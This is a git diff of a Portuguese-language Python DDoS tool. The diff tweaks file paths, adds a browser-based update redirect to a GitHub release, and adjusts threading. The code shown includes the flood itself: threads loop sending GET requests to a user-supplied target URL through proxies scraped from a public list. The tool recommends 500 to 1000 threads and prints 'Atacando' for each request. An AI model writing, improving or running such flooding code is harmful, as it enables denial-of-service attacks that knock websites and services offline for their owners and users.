@@ -5,9 +5,9 @@ import sys
 import platform
 import random
 
-_path_requirements = '../just/requirements.txt'
-_path_proxies = '../just/proxies.txt'
-_version = open('../just/versao').read()
+_path_requirements = 'just/requirements.txt'
+_path_proxies = 'just/proxies.txt'
+_version = open('just/versao').read()
 
 def Banner():
 	print('''
@@ -22,7 +22,7 @@ $$ |__$$ |$$ |__$$ |$$ \__$$ |/  \__$$ |
 $$    $$/ $$    $$/ $$    $$/ $$    $$/ 
 $$$$$$$/  $$$$$$$/   $$$$$$/   $$$$$$/  
                                         
- 	coded by Luiz1n tá?
+   coded by Luiz1n | https://github.com/luiz1n
 
 		\n''')
 Banner()
@@ -36,6 +36,13 @@ def CheckClear():
 def SaveProxies(content):
 	with open(_path_proxies, 'wb') as file:
 		file.write(content)
+
+def checkGoogle(versao_att):
+	if platform.system() == "Windows":
+		"https://github.com/luiz1n/DDoS/releases/download/1.1/DDoS.zip"
+		os.system(f'start chrome github.com/luiz1n/DDoS/releases/download/{versao_att}/DDoS.zip')
+	else:
+		os.system(f"google-chrome github.com/luiz1n/DDoS/releases/download/{versao_att}/DDoS.zip")
 
 def CheckInstaller():
 	try:
@@ -59,8 +66,9 @@ def CheckUpdates():
 	versao_atualizada = requests.get("https://pastebin.com/raw/hbF8RiMS").text
 	if _version != versao_atualizada.strip():
 		Error(f'{_version} | {versao_atualizada}')
-		Error("[Error] -> Existe uma nova versão do programa, instale-a no link abaixo e tente novamente. |")
-		Sucesso("https://github.com/luiz1n/DDoS/releases")
+		Error("[Error] -> Existe uma nova versão do programa, redirecionando...")
+		time.sleep(1)
+		checkGoogle(versao_atualizada)
 		exit()
 
 	else:
@@ -89,9 +97,7 @@ def CheckInternet():
 
 def Generate():
 	try:
-
-		time.sleep(1)
-		_request = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all&simplified=true").content
+		_request = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all&simplified=true", timeout=20).content
 		SaveProxies(_request.strip())
 		Sucesso("[Sucesso] Sucesso ao obter novas proxies. <Carregando DDoS> [...]")
 
@@ -99,7 +105,6 @@ def Generate():
 		Error("[Error] O site proxy-scrape não está respondendo.")
 
 def HowToUse():
-	time.sleep(10)
 	os.system("cls")
 	Error('''
 
@@ -124,21 +129,24 @@ try:
 
 		while True:
 			try:
-				Sucesso(f"[Sucesso] Atacando: {_url}")
+				Sucesso(f"[Sucesso] Atacando: {_url} | Threads: {_threads}")
 				requests.get(_url, headers=headers, proxies=proxies)
 			except Exception as e:
 				pass
 
 	def CreateThreading():
-		for thread in range(_threads * 2):
+		for thread in range(_threads):
 			_thread = threading.Thread(target=DDoS)
 			_thread.start()
 
 
-	#iniciar = input('\n\n[Enter] -> Deseja iniciar?')
+	iniciar = input('\n\n[Enter] -> Deseja iniciar?')
 	CreateThreading()
 
 
 except IndexError:
 	HowToUse()
 	exit()
+
+except ValueError:
+	Error(f"O Campo 'Threads' Só aceita números. Recomendado: 500-1000")
